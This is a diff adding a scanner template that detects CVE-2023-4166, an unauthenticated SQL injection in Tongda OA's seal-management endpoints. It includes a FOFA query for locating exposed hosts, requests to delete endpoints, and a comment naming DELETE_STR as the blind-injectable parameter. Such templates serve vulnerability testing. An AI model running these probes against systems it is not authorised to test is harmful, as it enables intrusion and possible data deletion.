@@ -1,0 +1,39 @@
+id: tongda-oa-general-system-seal-manage-unauth-sqli
+
+info:
+  name: tongda-oa-general-system-seal-manage-unauth-sqli
+  author: xy
+  severity: high
+  description: CVE-2023-4166，通达OA印章功能未授权访问导致SQL注入
+  reference:
+    - https://blog.csdn.net/holyxp/article/details/132211748
+  tags: tongda,oa,sqli
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    veified: true
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/general/system/seal_manage/{{path1}}?start="
+      - "{{RootURL}}/general/system/seal_manage/{{path2}}?DELETE_STR=1"
+
+    payloads:
+      path1:
+        - "dianju/log.php"
+        - "iweboffice/manage.php"
+      path2:
+        - "dianju/delete_log.php"
+        - "iweboffice/delete_seal.php"
+    attack: pitchfork
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'email_select')"
+          - "status_code_2 == 302 && contains((header_2), '.php?start=')"
+        condition: and
+
+#注入参数DELETE_STR，布尔、时间盲注
